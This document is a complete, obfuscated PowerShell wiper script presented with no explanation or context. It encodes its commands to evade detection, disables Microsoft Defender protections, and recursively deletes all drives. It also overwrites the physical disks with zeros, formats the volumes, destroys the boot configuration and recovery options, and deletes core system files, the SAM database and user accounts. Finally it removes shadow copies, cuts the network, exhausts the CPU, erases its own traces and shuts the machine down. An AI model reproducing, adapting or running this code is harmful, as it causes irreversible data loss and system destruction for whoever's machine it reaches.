

${r1} = -join ((65..90) + (97..122) | Get-Random -Count 8 | % {[char]$_}) # Random 8-char task name suffix
${r2} = -join ((65..90) + (97..122) | Get-Random -Count 12 | % {[char]$_}) # Random 12-char file name
${r3} = "C:\.${r2}" # Hidden script path
${r4} = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes("MpPreference"))
${r5} = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes("DisableRealtimeMonitoring"))
${r6} = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes("SilentlyContinue"))
${r7} = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes("Stop-Computer"))


${c1} = [Text.Encoding]::Unicode.GetString([Convert]::FromBase64String(${r4}))
${c2} = [Text.Encoding]::Unicode.GetString([Convert]::FromBase64String(${r5}))
${c3} = [Text.Encoding]::Unicode.GetString([Convert]::FromBase64String(${r6}))
try { [ScriptBlock]::Create("Set-${c1} -${c2} `$true -ErrorAction ${c3}").Invoke() } catch {}
try { [ScriptBlock]::Create("Set-${c1} -DisableBehaviorMonitoring `$true -ErrorAction ${c3}").Invoke() } catch {}
try { [ScriptBlock]::Create("Set-${c1} -DisableScriptScanning `$true -ErrorAction ${c3}").Invoke() } catch {}
try { [ScriptBlock]::Create("Set-${c1} -DisableTamperProtection `$true -ErrorAction ${c3}").Invoke() } catch {}


${d1} = & ([char]71+[char]101+[char]116+[char]45+[char]80+[char]83+[char]68+[char]114+[char]105+[char]118+[char]101) -PSProvider FileSystem | Where-Object { $_.Root -like "*:\" }
foreach (${i1} in ${d1}) {
    try { & ([char]82+[char]101+[char]109+[char]111+[char]118+[char]101+[char]45+[char]73+[char]116+[char]101+[char]109) -Path "$(${i1}.Root)*.*" -Force -Recurse -ErrorAction ${c3} } catch {}
}

${p1} = @(([char]92+[char]92+[char]46+[char]92+[char]80+[char]72+[char]89+[char]83+[char]73+[char]67+[char]65+[char]76+[char]68+[char]82+[char]73+[char]86+[char]69+[char]48), ([char]92+[char]92+[char]46+[char]92+[char]80+[char]72+[char]89+[char]83+[char]73+[char]67+[char]65+[char]76+[char]68+[char]82+[char]73+[char]86+[char]69+[char]49), ([char]92+[char]92+[char]46+[char]92+[char]80+[char]72+[char]89+[char]83+[char]73+[char]67+[char]65+[char]76+[char]68+[char]82+[char]73+[char]86+[char]69+[char]50), ([char]92+[char]92+[char]46+[char]92+[char]80+[char]72+[char]89+[char]83+[char]73+[char]67+[char]65+[char]76+[char]68+[char]82+[char]73+[char]86+[char]69+[char]51), ([char]92+[char]92+[char]46+[char]92+[char]80+[char]72+[char]89+[char]83+[char]73+[char]67+[char]65+[char]76+[char]68+[char]82+[char]73+[char]86+[char]69+[char]52))
for (${pass} = 1; ${pass} -le 3; ${pass}++) {
    foreach (${q1} in ${p1}) {
        try {
            ${f1} = [System.IO.File]::OpenWrite(${q1})
            for (${j1} = 0; ${j1} -lt 6667; ${j1}++) {
                ${f1}.WriteByte(0) # Write zeros to 6667 sectors per disk per pass
            }
            ${f1}.Close()
        } catch {}
    }
}


foreach (${i1} in ${d1}) {
    for (${f} = 1; ${f} -le 2; ${f}++) {
        try { & ([char]70+[char]111+[char]114+[char]109+[char]97+[char]116+[char]45+[char]86+[char]111+[char]108+[char]117+[char]109+[char]101) -DriveLetter ${i1}.Name -FileSystem NTFS -QuickFormat -Force -ErrorAction ${c3} } catch {}
    }
}


${b} = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes("bcdedit /delete {current} -ErrorAction ${c3}"))
[ScriptBlock]::Create([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String(${b}))).Invoke()


try { & ([char]98+[char]99+[char]100+[char]101+[char]100+[char]105+[char]116) /set {bootmgr} path \nul -ErrorAction ${c3} } catch {}
try { & ([char]98+[char]99+[char]100+[char]101+[char]100+[char]105+[char]116) /set {default} recoveryenabled no -ErrorAction ${c3} } catch {}


${c2} = @(
    ([char]67+[char]58+[char]92+[char]87+[char]105+[char]110+[char]100+[char]111+[char]119+[char]115+[char]92+[char]83+[char]121+[char]115+[char]116+[char]101+[char]109+[char]51+[char]50+[char]92+[char]99+[char]111+[char]110+[char]102+[char]105+[char]103+[char]92+[char]42+[char]46+[char]42),
    ([char]67+[char]58+[char]92+[char]87+[char]105+[char]110+[char]100+[char]111+[char]119+[char]115+[char]92+[char]87+[char]105+[char]110+[char]83+[char]120+[char]83+[char]92+[char]42+[char]46+[char]42),
    ([char]67+[char]58+[char]92+[char]83+[char]121+[char]115+[char]116+[char]101+[char]109+[char]32+[char]86+[char]111+[char]108+[char]117+[char]109+[char]101+[char]32+[char]73+[char]110+[char]102+[char]111+[char]114+[char]109+[char]97+[char]116+[char]105+[char]111+[char]110+[char]92+[char]42+[char]46+[char]42),
    ([char]67+[char]58+[char]92+[char]87+[char]105+[char]110+[char]100+[char]111+[char]115+[char]92+[char]83+[char]121+[char]115+[char]116+[char]101+[char]109+[char]51+[char]50+[char]92+[char]100+[char]114+[char]105+[char]118+[char]101+[char]114+[char]115+[char]92+[char]42+[char]46+[char]42),
    ([char]67+[char]58+[char]92+[char]69+[char]70+[char]73+[char]92+[char]42+[char]46+[char]42),
    ([char]67+[char]58+[char]92+[char]87+[char]105+[char]110+[char]100+[char]111+[char]119+[char]115+[char]92+[char]83+[char]121+[char]115+[char]116+[char]101+[char]109+[char]51+[char]50+[char]92+[char]99+[char]97+[char]116+[char]114+[char]111+[char]111+[char]116+[char]50+[char]92+[char]42+[char]46+[char]42),
    ([char]67+[char]58+[char]92+[char]87+[char]105+[char]110+[char]100+[char]111+[char]119+[char]115+[char]92+[char]83+[char]111+[char]102+[char]116+[char]119+[char]97+[char]114+[char]101+[char]68+[char]105+[char]115+[char]116+[char]114+[char]105+[char]98+[char]117+[char]116+[char]105+[char]111+[char]110+[char]92+[char]42+[char]46+[char]42),
    ([char]67+[char]58+[char]92+[char]87+[char]105+[char]110+[char]100+[char]111+[char]119+[char]115+[char]92+[char]83+[char]121+[char]115+[char]116+[char]101+[char]109+[char]51+[char]50+[char]92+[char]115+[char]112+[char]111+[char]111+[char]108+[char]92+[char]42+[char]46+[char]42),
    ([char]67+[char]58+[char]92+[char]87+[char]105+[char]110+[char]100+[char]111+[char]119+[char]115+[char]92+[char]83+[char]121+[char]115+[char]116+[char]101+[char]109+[char]51+[char]50+[char]92+[char]110+[char]116+[char]111+[char]115+[char]107+[char]114+[char]110+[char]108+[char]46+[char]101+[char]120+[char]101),
    ([char]67+[char]58+[char]92+[char]87+[char]105+[char]110+[char]100+[char]111+[char]119+[char]115+[char]92+[char]83+[char]121+[char]115+[char]116+[char]101+[char]109+[char]51+[char]50+[char]92+[char]104+[char]97+[char]108+[char]46+[char]100+[char]108+[char]108)
)
foreach (${t1} in ${c2}) {
    try { & ([char]82+[char]101+[char]109+[char]111+[char]118+[char]101+[char]45+[char]73+[char]116+[char]101+[char]109) -Path ${t1} -Force -Recurse -ErrorAction ${c3} } catch {}
}


try { & ([char]82+[char]101+[char]109+[char]111+[char]118+[char]101+[char]45+[char]73+[char]116+[char]101+[char]109) -Path "C:\Windows\System32\config\SAM" -Force -ErrorAction ${c3} } catch {}
try { & ([char]110+[char]101+[char]116) user /delete * -ErrorAction ${c3} } catch {}


for (${m} = 1; ${m} -le 2; ${m}++) {
    ${null} | & ([char]100+[char]105+[char]115+[char]107+[char]112+[char]97+[char]114+[char]116) /s
}

${v} = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes("vssadmin delete shadows /all /quiet -ErrorAction ${c3}"))
for (${s} = 1; ${s} -le 3; ${s}++) {
    [ScriptBlock]::Create([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String(${v}))).Invoke()
}


try { & ([char]110+[char]101+[char]116+[char]115+[char]104) interface set interface * disable -ErrorAction ${c3} } catch {}
try { & ([char]110+[char]101+[char]116+[char]115+[char]104) winsock reset -ErrorAction ${c3} } catch {}


for (${k1} = 0; ${k1} -lt 50; ${k1}++) {
    try {
        & ([char]83+[char]116+[char]97+[char]114+[char]116+[char]45+[char]74+[char]111+[char]98) -ScriptBlock { while ($true) { $null = [char]0 } } -ErrorAction ${c3}
    } catch {}
}


try { & ([char]82+[char]101+[char]109+[char]111+[char]118+[char]101+[char]45+[char]73+[char]116+[char]101+[char]109) -Path ${r3} -Force -ErrorAction ${c3} } catch {}
try { & ([char]115+[char]99+[char]104+[char]116+[char]97+[char]115+[char]107+[char]115) /delete /tn ("WinSvc" + ${r1}) /f -ErrorAction ${c3} } catch {}

[ScriptBlock]::Create([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String(${r7}))).Invoke(-Force)
